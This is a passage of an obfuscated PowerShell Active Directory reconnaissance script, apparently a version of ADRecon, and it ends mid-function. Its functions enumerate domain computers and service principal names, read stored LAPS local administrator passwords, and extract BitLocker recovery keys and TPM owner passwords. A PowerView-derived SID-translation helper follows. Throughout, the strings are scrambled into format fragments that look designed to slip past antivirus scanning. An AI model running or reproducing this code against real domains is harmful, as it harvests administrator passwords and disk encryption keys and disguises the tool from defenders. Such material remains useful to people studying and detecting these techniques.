            $ObjSearcher.PropertiesToLoad.AddRange((("{3}{1}{0}{2}" -f'scr','e','iption','d'),("{3}{1}{2}{4}{0}" -f 'e','sti','ngu','di','ishednam'),("{0}{2}{1}"-f'dnsh','stname','o'),("{0}{2}{1}{3}" -f 'lastlogo','timest','n','amp'),("{6}{4}{0}{5}{2}{3}{1}" -f 'S-Allo','ateTo','Del','eg','D','wedTo','ms'),("{4}{1}{2}{0}{3}" -f'Si','ds','-Creator','d','ms-'),("{1}{2}{0}{5}{3}{4}{6}"-f'pp','ms','DS-Su','yptionT','ype','ortedEncr','s'),("{1}{0}" -f'ame','n'),("{1}{0}" -f'jectsid','ob'),("{3}{0}{1}{2}"-f'in','gsy','stem','operat'),("{6}{5}{3}{4}{0}{1}{2}"-f'em','ho','tfix','ng','syst','rati','ope'),("{1}{7}{5}{6}{2}{4}{3}{0}" -f'k','oper','v','epac','ic','gsystems','er','atin'),("{5}{0}{1}{2}{4}{3}"-f 'ra','ting','s','ion','ystemvers','ope'),("{0}{2}{1}" -f 'primar','d','ygroupi'),("{0}{2}{1}"-f'p','astset','wdl'),("{1}{2}{0}"-f'me','samaccountn','a'),("{2}{1}{0}{3}{5}{4}"-f 'cep','ervi','s','rincipa','me','lna'),("{2}{0}{1}"-f'ist','ory','sidh'),("{5}{2}{1}{4}{0}{3}"-f'o','t','un','l','contr','useracco'),("{1}{2}{0}"-f'd','whenchang','e'),("{0}{1}{2}" -f'whe','ncr','eated')))
            $ObjSearcher.SearchScope = ("{1}{0}" -f 'e','Subtre')

            Try
            {
                $ADComputers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ("{7}{8}{10}{5}{14}{6}{1}{11}{12}{13}{0}{2}{15}{3}{4}{9}"-f 'mera','r] Err','ting Co','pu','ter Object','o','e','[','Get-','s','ADRC','or ','while e','nu','mput','m')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
            If ($ADRComputers)
            {
                $ComputerObj = [ADRecon.LDAPClass]::ComputerParser($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRComputerSPNs)
            {
                $ComputerSPNObj = [ADRecon.LDAPClass]::ComputerSPNParser($ADComputers, $Threads)
            }
            Remove-Variable ADComputers
        }
    }

    If ($ComputerObj)
    {
        Export-ADR -ADRObj $ComputerObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{0}{1}" -f 'mpute','rs','Co')
        Remove-Variable ComputerObj
    }
    If ($ComputerSPNObj)
    {
        Export-ADR -ADRObj $ComputerSPNObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{1}{0}{3}" -f'terS','mpu','Co','PNs')
        Remove-Variable ComputerSPNObj
    }
}

# based on https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
Function Get-ADRLAPSCheck
{
<#
.SYNOPSIS
    Returns all LAPS (local administrator) stored passwords in the current (or specified) domain.

.DESCRIPTION
    Returns all LAPS (local administrator) stored passwords in the current (or specified) domain. Other details such as the Password Expiration, whether the password is readable by the current user are also returned.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{0}{1}"-f 'A','DWS'))
    {
        Try
        {
            $ADComputers = @( Get-ADObject -LDAPFilter ("{2}{3}{5}{1}{0}{4}" -f'e=805','yp','(samAccou','nt','306369)','T') -Properties CN,DNSHostName,("{0}{3}{2}{1}" -f'ms','wd','mP','-Mcs-Ad'),("{0}{3}{1}{4}{6}{8}{2}{7}{5}"-f'ms-','-','dExpira','Mcs','A','e','dmP','tionTim','w') -ResultPageSize $PageSize )
        }
        Catch [System.ArgumentException]
        {
            Write-Warning ("{1}{2}{6}{0}{5}{3}{4}" -f't ','[*','] L','t','ed.','implemen','APS is no')
            Return $null
        }
        Catch
        {
            Write-Warning ("{6}{0}{12}{9}{10}{4}{8}{15}{7}{13}{5}{11}{14}{1}{3}{2}" -f 'G','numerat','S Objects','ing LAP','APSCh','whi','[','o','eck] ','ADR','L','le ','et-','r ','e','Err')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total LAPS Objects: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            $LAPSObj = [ADRecon.ADWSClass]::LAPSParser($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Method -eq ("{0}{1}" -f'LDA','P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (("{4}{2}{0}{1}{3}" -f'05','306','ccountType=8','369)','(samA'))
        $ObjSearcher.PropertiesToLoad.AddRange(("cn",("{3}{1}{0}{2}"-f'stn','nsho','ame','d'),("{0}{1}{2}" -f'ms-mc','s-ad','mpwd'),("{1}{0}{3}{2}{4}" -f'cs-','ms-m','xpiratio','admpwde','ntime')))
        $ObjSearcher.SearchScope = ("{1}{0}"-f 'ree','Subt')
        Try
        {
            $ADComputers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{8}{5}{4}{7}{10}{14}{1}{12}{2}{0}{13}{9}{6}{3}{11}"-f'ng',' ','le enumerati','bje','t-ADRLAPSCheck]','e','O',' Er','[G',' ','ro','cts','whi',' LAPS','r')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADComputers)
        {
            $LAPSCheck = [ADRecon.LDAPClass]::LAPSCheck($ADComputers)
            If (-Not $LAPSCheck)
            {
                Write-Warning ("{2}{0}{1}{6}{4}{3}{5}"-f'o','t im','[*] LAPS is n','ted','n','.','pleme')
                Return $null
            }
            Else
            {
                Write-Verbose "[*] Total LAPS Objects: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
                $LAPSObj = [ADRecon.LDAPClass]::LAPSParser($ADComputers, $Threads)
                Remove-Variable ADComputers
            }
        }
    }

    If ($LAPSObj)
    {
        Return $LAPSObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRBitLocker
{
<#
.SYNOPSIS
    Returns all BitLocker Recovery Keys stored in the current (or specified) domain.

.DESCRIPTION
    Returns all BitLocker Recovery Keys stored in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ("{1}{0}"-f 'S','ADW'))
    {
        Try
        {
            $ADBitLockerRecoveryKeys = Get-ADObject -LDAPFilter (("{2}{0}{5}{8}{4}{6}{9}{7}{3}{1}" -f 'c',')','(obje','n','-Rec','t','ov','formatio','Class=msFVE','eryIn')) -Properties distinguishedName,msFVE-RecoveryPassword,msFVE-RecoveryGuid,msFVE-VolumeGuid,Name,whenCreated
        }
        Catch
        {
            Write-Warning ("{15}{12}{7}{10}{3}{14}{16}{5}{8}{17}{13}{1}{6}{11}{9}{0}{2}{4}"-f 'mat','er','ion Obj','rro','ects','erating m','yI','tLoc','sFVE-','r','ker] E','nfo','-ADRBi','cov','r while en','[Get','um','Re')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $([ADRecon.ADWSClass]::ObjectCount($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose ('[*]'+' '+'Tota'+'l '+'BitLoc'+'ker'+' '+'Reco'+'very'+' '+'Key'+'s:'+' '+"$cnt")
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    # Create the object for each instance.
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}{3}{4}" -f 'Distin','g','uis','hed Nam','e') -Value $((($_.distinguishedName -split '}')[1]).substring(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Na','me') -Value $_.Name
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{1}{3}" -f'enCreat','e','wh','d') -Value $_.whenCreated
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{4}{3}{1}{2}"-f'Re','y Ke','y ID','er','cov') -Value $([GUID] $_.'msFVE-RecoveryGuid')
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f'very Key','o','Rec') -Value $_.'msFVE-RecoveryPassword'
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f 'Vo','UID','lume G') -Value $([GUID] $_.'msFVE-VolumeGuid')
                    Try
                    {
                        $TempComp = Get-ADComputer -Identity $Obj.'Distinguished Name' -Properties msTPM-OwnerInformation,msTPM-TpmInformationForComputer
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    }
                    If ($TempComp)
                    {
                        # msTPM-OwnerInformation (Vista/7 or Server 2008/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{5}{3}{4}{2}{6}{1}{0}" -f 'ormation','Inf','wn','T','PM-O','ms','er') -Value $TempComp.'msTPM-OwnerInformation'

                        # msTPM-TpmInformationForComputer (Windows 8/10 or Server 2012/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{5}{4}{0}{2}{3}{7}{6}{1}"-f'-TpmInfor','ter','ma','tionFor','sTPM','m','u','Comp') -Value $TempComp.'msTPM-TpmInformationForComputer'
                        If ($null -ne $TempComp.'msTPM-TpmInformationForComputer')
                        {
                            # Grab the TPM Owner Info from the msTPM-InformationObject
                            $TPMObject = Get-ADObject -Identity $TempComp.'msTPM-TpmInformationForComputer' -Properties msTPM-OwnerInformation
                            $TPMRecoveryInfo = $TPMObject.'msTPM-OwnerInformation'
                        }
                        Else
                        {
                            $TPMRecoveryInfo = $null
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{4}{1}{5}{2}{3}"-f'msTPM-','nerIn','ma','tion','Ow','for') -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{2}{0}{6}{4}{1}{7}{5}"-f'n','at','mI','msTPM-Tp','orm','onForComputer','f','i') -Value $null
                        $TPMRecoveryInfo = $null

                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{4}{3}{2}{1}{0}{5}" -f 'swo','s',' Pa','Owner','TPM ','rd') -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($Method -eq ("{1}{0}" -f 'AP','LD'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ("{3}{0}{1}{5}{4}{2}{6}"-f'ss=','msFVE-Recov','rmat','(objectCla','Info','ery','ion)')
        $ObjSearcher.PropertiesToLoad.AddRange((("{0}{1}{3}{2}" -f 'd','istin','hedName','guis'),("{4}{2}{1}{0}{3}"-f 'passw','covery','fve-re','ord','ms'),("{2}{1}{0}{3}{4}"-f'er','e-recov','msfv','y','guid'),("{1}{2}{0}" -f 'd','msfve-vol','umegui'),("{4}{3}{1}{6}{5}{2}{0}" -f'n','er','io','wn','mstpm-o','rmat','info'),("{2}{4}{0}{8}{3}{1}{7}{6}{5}"-f 'tp','orcom','ms','ormationf','tpm-','r','ute','p','minf'),("{0}{1}" -f'n','ame'),("{2}{1}{0}" -f'd','eate','whencr')))
        $ObjSearcher.SearchScope = ("{1}{0}"-f'btree','Su')

        Try
        {
            $ADBitLockerRecoveryKeys = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{19}{9}{12}{5}{21}{15}{20}{3}{1}{4}{22}{11}{17}{0}{8}{10}{13}{7}{6}{16}{18}{2}{14}"-f'eryIn','-','c','msFVE','R','er] Error while ','atio','m','f','Get-ADR','o','o','BitLock','r','ts','numerati','n','v',' Obje','[','ng ','e','ec')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose ('[*'+'] '+'T'+'otal '+'B'+'itL'+'ocker '+'Rec'+'ove'+'ry '+'Ke'+'ys: '+"$cnt")
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    # Create the object for each instance.
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{3}{0}"-f 'me','hed','Distinguis',' Na') -Value $((($_.Properties.distinguishedname -split '}')[1]).substring(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'me','Na') -Value ([string] ($_.Properties.name))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}"-f'C','when','reated') -Value ([DateTime] $($_.Properties.whencreated))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{1}{2}{0}" -f'ID','ry Key',' ','Recove') -Value $([GUID] $_.Properties.'msfve-recoveryguid'[0])
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}" -f 'Recove','ry K','ey') -Value ([string] ($_.Properties.'msfve-recoverypassword'))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'me GU','Volu','ID') -Value $([GUID] $_.Properties.'msfve-volumeguid'[0])

                    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    $ObjSearcher.PageSize = $PageSize
                    $ObjSearcher.Filter = "(&(samAccountType=805306369)(distinguishedName=$($Obj.'Distinguished Name'))) "
                    $ObjSearcher.PropertiesToLoad.AddRange((("{2}{0}{5}{1}{3}{4}" -f 's','ner','m','informa','tion','tpm-ow'),("{6}{2}{1}{4}{3}{0}{5}"-f 'te','t','-','onforcompu','pminformati','r','mstpm')))
                    $ObjSearcher.SearchScope = ("{1}{0}" -f'ubtree','S')

                    Try
                    {
                        $TempComp = $ObjSearcher.FindAll()
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    }
                    $ObjSearcher.dispose()

                    If ($TempComp)
                    {
                        # msTPM-OwnerInformation (Vista/7 or Server 2008/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{5}{0}{2}{1}{4}{3}" -f 'Ow','erI','n','ormation','nf','msTPM-') -Value $([string] $TempComp.Properties.'mstpm-ownerinformation')

                        # msTPM-TpmInformationForComputer (Windows 8/10 or Server 2012/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{8}{7}{0}{9}{6}{2}{5}{3}{4}"-f'pmIn','msTPM','ati','rComput','er','onFo','m','T','-','for') -Value $([string] $TempComp.Properties.'mstpm-tpminformationforcomputer')
                        If ($null -ne $TempComp.Properties.'mstpm-tpminformationforcomputer')
                        {
                            # Grab the TPM Owner Info from the msTPM-InformationObject
                            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                            {
                                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($TempComp.Properties.'mstpm-tpminformationforcomputer')", $Credential.UserName,$Credential.GetNetworkCredential().Password
                                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                                $objSearcherPath.PropertiesToLoad.AddRange((("{0}{3}{5}{6}{2}{1}{4}" -f 'ms','ormati','nf','t','on','p','m-owneri')))
                                Try
                                {
                                    $TPMObject = $objSearcherPath.FindAll()
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                $objSearcherPath.dispose()

                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject.Properties.'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    $TPMObject = ([ADSI]"LDAP://$($TempComp.Properties.'mstpm-tpminformationforcomputer')")
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject.Properties.'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{5}{2}{4}{0}{1}{3}"-f 'r','Informatio','sTPM-Own','n','e','m') -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{3}{1}{8}{5}{7}{4}{0}{6}"-f 'te','TPM','m','s','nForCompu','I','r','nformatio','-Tpm') -Value $null
                        $TPMRecoveryInfo = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{4}{0}{1}{2}{3}"-f 'Pa','sswo','r','d','TPM Owner ') -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable cnt
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($BitLockerObj)
    {
        Return $BitLockerObj
    }
    Else
    {
        Return $null
    }
}

# Modified ConvertFrom-SID function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function ConvertFrom-SID
{
<#
.SYNOPSIS
    Converts a security identifier (SID) to a group/user name.

    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause

.DESCRIPTION
    Converts a security identifier string (SID) to a group/user name using IADsNameTranslate interface.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER ObjectSid
    Specifies one or more SIDs to convert.

.PARAMETER DomainFQDN
    Specifies the FQDN of the Domain.

.PARAMETER Credential
    Specifies an alternate credential to use for the translation.

.PARAMETER ResolveSIDs
    [bool]
    Whether to resolve SIDs in the ACLs module. (Default False)

.EXAMPLE

    ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

    TESTLAB\harmj0y

.EXAMPLE

    "S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID

    TESTLAB\WINDOWS2$
    TESTLAB\harmj0y
    BUILTIN\Distributed COM Users

.EXAMPLE

    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
    ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred

    TESTLAB\harmj0y

.INPUTS
    [String]
    Accepts one or more SID strings on the pipeline.

.OUTPUTS
    [String]
    The converted DOMAIN\username.
#>
    Param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [Alias('SID')]
        #[ValidatePattern('^S-1-.*')]
        [String]
        $ObjectSid,

        [Parameter(Mandatory = $false)]
        [string] $DomainFQDN,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false)]
        [bool] $ResolveSID = $false
    )

    BEGIN {
        # Name Translator Initialization Types
        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        $ADS_NAME_INITTYPE_DOMAIN   = 1 # Initializes a NameTranslate object by setting the domain that the object binds to.
        #$ADS_NAME_INITTYPE_SERVER   = 2 # Initializes a NameTranslate object by setting the server that the object binds to.
        $ADS_NAME_INITTYPE_GC       = 3 # Initializes a NameTranslate object by locating the global catalog that the object binds to.

        # Name Transator Name Types
        # https://msdn.microsoft.com/en-us/library/aa772267%28v=vs.85%29.aspx
        #$ADS_NAME_TYPE_1779                     = 1 # Name format as specified in RFC 1779. For example, "CN=Jeff Smith,CN=users,DC=Fabrikam,DC=com".
        #$ADS_NAME_TYPE_CANONICAL                = 2 # Canonical name format. For example, "Fabrikam.com/Users/Jeff Smith".
        $ADS_NAME_TYPE_NT4                      = 3 # Account name format used in Windows. For example, "Fabrikam\JeffSmith".
        #$ADS_NAME_TYPE_DISPLAY                  = 4 # Display name format. For example, "Jeff Smith".
        #$ADS_NAME_TYPE_DOMAIN_SIMPLE            = 5 # Simple domain name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_ENTERPRISE_SIMPLE        = 6 # Simple enterprise name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_GUID                     = 7 # Global Unique Identifier format. For example, "{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}".
        $ADS_NAME_TYPE_UNKNOWN                  = 8 # Unknown name type. The system will estimate the format. This element is a meaningful option only with the IADsNameTranslate.Set or the IADsNameTranslate.SetEx method, but not with the IADsNameTranslate.Get or IADsNameTranslate.GetEx method.
        #$ADS_NAME_TYPE_USER_PRINCIPAL_NAME      = 9 # User principal name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_CANONICAL_EX             = 10 # Extended canonical name format. For example, "Fabrikam.com/Users Jeff Smith".
        #$ADS_NAME_TYPE_SERVICE_PRINCIPAL_NAME   = 11 # Service principal name format. For example, "www/www.fabrikam.com@fabrikam.com".
        #$ADS_NAME_TYPE_SID_OR_SID_HISTORY_NAME  = 12 # A SID string, as defined in the Security Descriptor Definition Language (SDDL), for either the SID of the current object or one from the object SID history. For example, "O:AOG:DAD:(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-0-0)"

        # https://msdn.microsoft.com/en-us/library/aa772250.aspx
        #$ADS_CHASE_REFERRALS_NEVER       = (0x00) # The client should never chase the referred-to server. Setting this option prevents a client from contacting other servers in a referral process.
        #$ADS_CHASE_REFERRALS_SUBORDINATE = (0x20) # The client chases only subordinate referrals which are a subordinate naming context in a directory tree. For example, if the base search is requested for "DC=Fabrikam,DC=Com", and the server returns a result set and a referral of "DC=Sales,DC=Fabrikam,DC=Com" on the AdbSales server, the client can contact the AdbSales server to continue the search. The ADSI LDAP provider always turns off this flag for paged searches.
        #$ADS_CHASE_REFERRALS_EXTERNAL    = (0x40) # The client chases external referrals. For example, a client requests server A to perform a search for "DC=Fabrikam,DC=Com". However, server A does not contain the object, but knows that an independent server, B, owns it. It then refers the client to server B.
        $ADS_CHASE_REFERRALS_ALWAYS      = (0x60) # Referrals are chased for either the subordinate or external type.
    }

    PROCESS {
        $TargetSid = $($ObjectSid.TrimStart("O:"))
        $TargetSid = $($TargetSid.Trim('*'))
        If ($TargetSid -match ("{1}{2}{0}" -f'-.*','^','S-1'))
        {
            Try
            {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch ($TargetSid) {
                    ("{1}{0}" -f '-1-0','S')         { ("{1}{3}{2}{4}{0}"-f'rity','Nu','Aut','ll ','ho') }
                    ("{1}{0}" -f'0-0','S-1-')       { ("{2}{1}{0}"-f 'dy','o','Nob') }
                    ("{0}{1}" -f'S-','1-1')         { ("{2}{3}{1}{0}"-f 'ity','hor','Wo','rld Aut') }
                    ("{1}{0}" -f'-1-0','S-1')       { ("{0}{1}" -f'Ev','eryone') }
                    ("{0}{1}"-f 'S-1','-2')         { ("{0}{2}{3}{1}" -f'Lo','hority','cal Au','t') }
                    ("{2}{0}{1}" -f '1-2-','0','S-')       { ("{1}{0}" -f'ocal','L') }
                    ("{0}{2}{1}"-f 'S-','1','1-2-')       { ("{0}{1}{3}{2}{4}"-f 'Cons','ol',' Lo','e','gon ') }
                    ("{0}{1}" -f 'S-','1-3')         { ("{0}{3}{2}{1}" -f 'Crea','ty','uthori','tor A') }
                    ("{2}{0}{1}" -f'-1-3','-0','S')       { ("{1}{2}{0}"-f 'wner','Cr','eator O') }
                    ("{1}{0}{2}" -f '-','S-1-3','1')       { ("{3}{1}{0}{2}" -f'or Gro','at','up','Cre') }
                    ("{0}{1}" -f 'S-1','-3-2')       { ("{2}{1}{0}{3}" -f'er Serve','r Own','Creato','r') }
                    ("{1}{0}"-f '-1-3-3','S')       { ("{1}{3}{0}{2}"-f 'p Serv','Creator G','er','rou') }
                    ("{2}{1}{0}" -f '4','-','S-1-3')       { ("{2}{1}{3}{0}"-f 'ghts','wn','O','er Ri') }
                    ("{0}{1}"-f 'S-1-','4')         { ("{0}{3}{2}{1}" -f 'Non-','y','t','unique Authori') }
                    ("{0}{1}" -f 'S','-1-5')         { ("{3}{2}{0}{1}" -f'Aut','hority','T ','N') }
                    ("{1}{0}"-f'-5-1','S-1')       { ("{0}{1}" -f'Dialu','p') }
                    ("{1}{2}{0}"-f '5-2','S-','1-')       { ("{1}{0}{2}"-f 'etwor','N','k') }
                    ("{0}{1}{2}"-f 'S-1','-5-','3')       { ("{0}{1}" -f'Ba','tch') }
                    ("{0}{1}{2}" -f 'S-','1-5-','4')       { ("{0}{2}{3}{1}"-f'In','ive','te','ract') }
                    ("{0}{1}"-f'S','-1-5-6')       { ("{1}{0}"-f'e','Servic') }
                    ("{1}{0}"-f'-7','S-1-5')       { ("{0}{2}{1}"-f'Anonym','s','ou') }
                    ("{0}{1}" -f 'S-1-','5-8')       { ("{0}{1}" -f'Pro','xy') }
                    ("{0}{1}"-f'S-','1-5-9')       { ("{3}{5}{2}{4}{0}{1}"-f'ler','s','rprise Do','E','main Control','nte') }
                    ("{0}{2}{1}" -f 'S','1-5-10','-')      { ("{0}{1}{3}{2}" -f'Prin','cip','l Self','a') }
                    ("{1}{0}"-f '11','S-1-5-')      { ("{1}{3}{2}{0}"-f 's','Authenticat',' User','ed') }
                    ("{2}{0}{1}" -f '-','1-5-12','S')      { ("{0}{3}{1}{2}" -f'R','cted C','ode','estri') }
                    ("{0}{1}"-f'S-1-5-1','3')      { ("{0}{2}{3}{1}"-f'Terminal Se','sers','rver',' U') }
                    ("{0}{1}"-f 'S-1-5-','14')      { ("{6}{1}{2}{3}{0}{4}{5}" -f 'nterac','e','mot','e I','tive Lo','gon','R') }
                    ("{0}{1}{2}" -f'S-','1-5-1','5')      { ("{3}{4}{0}{2}{1}" -f 'nizatio',' ','n','This Or','ga') }
                    ("{0}{1}" -f 'S-1-5-1','7')      { ("{0}{1}{4}{2}{3}" -f 'T','his Org','zation',' ','ani') }
                    ("{2}{1}{0}"-f '5-18','1-','S-')      { ("{2}{3}{0}{1}" -f'e','m','Loc','al Syst') }
                    ("{1}{0}{2}"-f'-5','S-1','-19')      { ("{1}{2}{3}{0}" -f 'y','NT',' Au','thorit') }
                    ("{1}{0}" -f'20','S-1-5-')      { ("{3}{1}{2}{0}" -f'ity','Auth','or','NT ') }
                    ("{3}{0}{2}{1}" -f '-1','-80-0','-5','S')    { ("{3}{1}{2}{0}" -f'ervices ','l',' S','Al') }
                    ("{0}{3}{1}{2}" -f 'S-1','32-5','44','-5-')  { ((("{1}{0}{3}{5}{6}{4}{2}"-f'LTIN','BUI','ors','JKrAdm','rat','inis','t')) -crePLacE([char]74+[char]75+[char]114),[char]92) }
                    ("{0}{2}{1}"-f 'S-1-5-3','45','2-5')  { ((("{3}{2}{0}{1}"-f 'IN{0}Us','ers','ILT','BU'))  -F[CHar]92) }
                    ("{0}{2}{1}"-f'S-1-5-','2-546','3')  { ((("{0}{2}{4}{3}{1}" -f 'B','s','UILTIN','est','{0}Gu'))  -f  [ChAR]92) }
                    ("{3}{2}{1}{0}" -f '-547','-32','1-5','S-')  { ((("{0}{5}{6}{3}{1}{4}{2}" -f 'B','se','s',' U','r','U','ILTINYpkPower')).repLace('Ypk',[stRING][ChAr]92)) }
                    ("{0}{1}{3}{2}" -f 'S-1','-','-548','5-32')  { ((("{1}{2}{0}{3}{6}{7}{5}{4}" -f'{0}','BU','ILTIN','Acco','ors','perat','u','nt O'))-F  [CHAr]92) }
                    ("{2}{0}{3}{1}" -f '-5-32','49','S-1','-5')  { ((("{7}{2}{4}{5}{1}{3}{6}{0}" -f 's','ve','LT','r','INK3FSe','r',' Operator','BUI')) -CREPlAce'K3F',[cHar]92) }
                    ("{0}{3}{2}{1}" -f'S-','32-550','-','1-5')  { ((("{4}{2}{1}{0}{3}" -f'qPrint Opera','N4H','I','tors','BUILT')) -crePLAcE([ChAr]52+[ChAr]72+[ChAr]113),[ChAr]92) }
